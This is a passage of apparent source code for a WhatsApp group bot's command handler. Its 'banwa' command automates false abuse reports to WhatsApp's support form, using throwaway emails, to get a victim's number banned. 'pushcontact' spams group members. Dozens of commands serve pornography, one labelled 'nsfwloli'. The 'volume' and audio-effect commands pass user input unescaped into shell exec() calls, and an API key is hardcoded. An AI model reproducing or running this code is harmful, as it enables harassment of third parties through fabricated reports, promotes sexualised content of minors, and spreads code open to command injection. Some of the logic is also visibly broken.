sourceType: "commonjs"
})
if (err) _syntax = err + "\n\n"
replygcTzy(util.format(_syntax + _err))
}
break;
        case 'banwa': {

if (!TzyTheCreator) return 

if (!text) return replygcTzy(`Where's the number?`)

let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")

let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")

let cookie = ntah.headers["set-cookie"].join("; ")

let $ = cheerio.load(ntah.data)

let $form = $("form");

let url = new URL($form.attr("action"), "https://www.whatsapp.com").href

let form = new URLSearchParams()

form.append("jazoest", $form.find("input[name=jazoest]").val())

form.append("lsd", $form.find("input[name=lsd]").val())

form.append("step", "submit")

form.append("country_selector", "ID")

form.append("phone_number", text)

form.append("email", email.data[0])

form.append("email_confirm", email.data[0])

form.append("platform", "ANDROID")

form.append("your_message", `Hello Dear WhatsApp

Good morning/afternoon/night

My WhatsApp Number ${text} Stolen And Now Used to spread pornography and illegal sales, please take immediate action regarding my account.

If you can, just disable it

for important chat matters I don't have it

Thank you`)

form.append("__user", "0")

form.append("__a", "1")

form.append("__csr", "")

form.append("__req", "8")

form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")

form.append("dpr", "1")

form.append("__ccg", "UNKNOWN")

form.append("__rev", "1006630858")

form.append("__comment_req", "0")

let res = await axios({

  url,

  method: "POST",

  data: form,

  headers: {

    cookie

  }

})

replygcTzy(util.format(JSON.parse(res.data.replace("for (;;);", ""))))

}

break
case 'pushcontact': {
    if (!TzyTheCreator) return replygcTzy(mess.owner)
      if (!m.isGroup) return replygcTzy(`The feature works only in grup`)
    if (!text) return replygcTzy(`text?`)
    let mem = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
    replygcTzy(`Success in pushing the message to contacts`)
    for (let pler of mem) {
    yudamods.sendMessage(pler, { text: q})
     }  
     replygcTzy(`Done`)
      }
      break
            case 'id':{
            replygcTzy(from)
           }
          break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replygcTzy(`Example : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replygcTzy(`Example : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await yudamods.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)
if (!isPrem) return replyprem(mess.premium)
if (!AntiNsfw) return m.reply(mess.nsfw)
replygcTzy(mess.wait)
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
yudamods.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })
}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
                m.reply(mess.wait)
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                yudamods.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
            }
            break
case 'trap' :
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break
case 'gasm':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url:waifudd.data.url } }, { quoted: m })
break  
case 'milf':
if (!m.isGroup) return replygcTzy(mess.group)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/milf.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break 
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return m.reply(mess.nsfw)
m.reply(mess.wait)						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await yudamods.sendMessage(m.chat, { caption:  `Here you go!`, image: {url:waifudd.data.url} },{ quoted:m }).catch(err => {
                    return('Error!')
                })
break
case 'ahegao':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'ass':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'bdsm':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'blowjob':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'cuckold':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'cum':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'eba':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'ero':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'femdom':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'foot':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'gangbang':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'glasses':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'hentai':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'jahy':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'manga':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'masturbation':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'neko-hentai':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'neko-hentai2':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'nsfwloli':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'orgy':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'panties':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'pussy':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'tentacles':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'thights':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thights.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'yuri':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'zettai':
if (!m.isGroup) return replygcTzy(mess.group)
	if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var Tzyyresult = pickRandom(ahegaonsfw)
yudamods.sendMessage(m.chat, { caption: mess.success, image: { url: Tzyyresult.url } }, { quoted: m })
break
case 'gifblowjob':
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await yudamods.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var Tzyyresultx = pickRandom(ahegaonsfw)
    await yudamods.sendMessage(m.chat,{video:Tzyyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
    case 'gifs': case 'foot': {
if (!m.isGroup) return replygcTzy(mess.group)
if (!AntiNsfw) return replygcTzy(mess.nsfw)
replygcTzy(mess.wait)
let heyy
    let yeha = heyy[Math.floor(Math.random() * heyy.length)];
    if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/gifs.json')
    if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGTzy/TzyMedia/master/foot.json')
yudamods.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
    case 'igemoji': 
case 'instagramemoji': 
if (!q) return replygcTzy("Enter emoji, maximum 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "11")
break
case 'iphoneemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "0")
break
case 'googleemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "1")
break
case 'samsungemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "2")
break
case 'microsoftemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "3")
break
case 'whatsappemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "4")
break
case 'twitteremoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "5")
break
case 'facebookemoji': 
case 'fbemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "6")
break
case 'skypeemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "7")
break
case 'joyemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "8")
break
case 'mojiemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "9")
case 'pediaemoji': 
if (!q) return replygcTzy("Enter emoji, max 1 emoji, eg?" + ` ${prefix + command} 😀`)
replygcTzy(mess.wait)
emote(q, "10")
break
case 'emoji': {
if (!args.join(" ")) return replygcTzy('Where is the emoji?')
emoji.get(args.join(" ")).then(async(emoji) => {
let mese = await yudamods.sendMessage(m.chat, {image:{url:emoji.images[4].url}, caption: `Made by ${global.botname}`}, {quoted:m})
await yudamods.sendMessage(from, {text:"reply #s to this image to make sticker"}, {quoted:mese})
})
}
break
case 'volume': {
if (!args.join(" ")) return replygcTzy(`Example: ${prefix + command} 10`)
media = await yudamods.downloadAndSaveMediaMessage(quoted, "volume")
if (isQuotedAudio) {
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcTzy('Error!')
jadie = fs.readFileSync(rname)
yudamods.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
} else if (isQuotedVideo) {
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error!')
jadie = fs.readFileSync(rname)
yudamods.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
} else {
replygcTzy("Send video/audio")
}
}
break
 case 'tinyurl':{
   if(!q) return replygcTzy('link?')
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replygcTzy(body)
  } catch (e) {
  m.reply(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replygcTzy(`Where is the link?\nExample :\n${prefix}${command} https://github.com/DGTzy/TzyMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replygcTzy(`Link invalid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    yudamods.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => replygcTzy(mess.error))
break
case 'spotify':
if (!text) return replygcTzy(`Where is the link?`)
        const Spotify = require('./lib/spotify')
        const spotify = new Spotify(text)
        const info = await spotify.getInfo()
        if ((info).error) return replygcTzy(`The link you provided is not spotify link`)
        const { name, artists, album_name, release_date, cover_url } = info
        const details = `${themeemoji} *Title:* ${name || ''}\n${themeemoji} *Artists:* ${(artists || []).join(
            ','
        )}\n${themeemoji} *Album:* ${album_name}\n${themeemoji} *Release Date:* ${release_date || ''}`
       const response = await yudamods.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
        const bufferpotify = await spotify.download()
        await yudamods.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                replygcTzy(mess.wait)
                let media = await yudamods.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return m.reply(err)
                let buff = fs.readFileSync(ran)
                yudamods.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                })
                } else replygcTzy(`Reply to the audio you want to change with a caption *${prefix + command}*`)
                } catch (e) {
                replygcTzy(e)
                }
                break
                case 'define': 
if (!q) return replygcTzy(`What do you want to define?`)
try {
targetfine = await axios.get(`http://api.urbandictionary.com/v0/define?term=${q}`)
if (!targetfine) return replygcTzy(mess.error)
const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
    .replace(/\[/g, "")
    .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
    .replace(/\[/g, "")
    .replace(/\]/g, "")}`
   yudamods.sendMessage(m.chat,{text:reply},{quoted:m})
} catch (err) {
    console.log(err)
    return replygcTzy(`*${q}* isn't a valid text`)
    }
    break
                case 'can': {
            	if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} i dance?`)
            	let bisa = [`Can`,`Can't`,`Cannot`,`Of Course You Can!!!`]
                let keh = bisa[Math.floor(Math.random() * bisa.length)]
                let jawab = `*Can ${text}*\nAnswer : ${keh}`
            await replygcTzy(jawab)
            }
            break
            case 'is': {
            	if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} she virgin?`)
            	let apa = [`Yes`, `No`, `It Could Be`, `Thats right`]
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = `*Is ${text}*\nAnswer : ${kah}`                
            await replygcTzy(jawab)
            }
            break
            case 'when': {
            	if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} will i get married?`)
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = `*${command} ${text}*\nAnswer : ${koh}`                
            await replygcTzy(jawab)
            }
            break
case 'what': {
            	if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let lel = [`Ask Your Gf`, `I Dont Know`, `I Don't Know, Ask Your Father`]
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = `*What ${text}*\nAnswer : ${kah}`                
            await replygcTzy(jawab)
            }
            break
case 'where': {
if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} is your name?`)
            	let wherelol = [`In the mountain`, `On mars`, `On moon`,`In the jungle`,`I dont know ask your mom`,`It could be somewhere`]
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = `*Whwre ${text}*\nAnswer : ${kah}`              
            await replygcTzy(jawab)
            }
            break
case 'how': {
            	if (!text) return replygcTzy(`Ask question\n\nExample : ${prefix + command} to date girl?`)
            	let gimana = [`Ummm...`, `It's Difficult Bro`, `Sorry Bot Can't Answer`, `Try Searching On Google`,`Holy Cow! Really???`,`Dizzy Ah😴, don't wanna answer`,`Ohhh I See:(`,`The Patient, Boss:(`,`Really dude 🙄`]
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = `*How ${text}*\nAnswer : ${kah}`                
            await replygcTzy(jawab)
            }
            break
case 'rate': {
            	if (!text) return replygcTzy(`Example : ${prefix + command} my profile`)
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = `*Rate ${text}*\nAnswer : ${kah}%`                
            await replygcTzy(jawab)
            }
            break
            case 'runtime': {
            	let lowq = `*The Bot Has Been Online For:*\n*${runtime(process.uptime())}*`
                replygcTzy(lowq)
            	}
            break
            case 'stupidcheck':case 'uncleancheck':
case 'hotcheck': case 'smartcheck':
case 'greatcheck':
case 'evilcheck':case 'dogcheck':
case 'coolcheck':
case 'waifucheck':
cantik = body.slice(1)
const okebnh1 =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const Tzykak = okebnh1[Math.floor(Math.random() * okebnh1.length)]
yudamods.sendMessage(m.chat, { text: Tzykak }, { quoted: m })
break
            case 'soulmate': {
            if (!m.isGroup) throw mess.group
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
yudamods.sendMessage(m.chat,
{ text: `👫Your Soulmate Is

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`,
contextInfo:{
mentionedJid:[me, jodoh],
forwardingScore: 9999999,
isForwarded: true, 
"externalAdReply": {
"showAdAttribution": true,
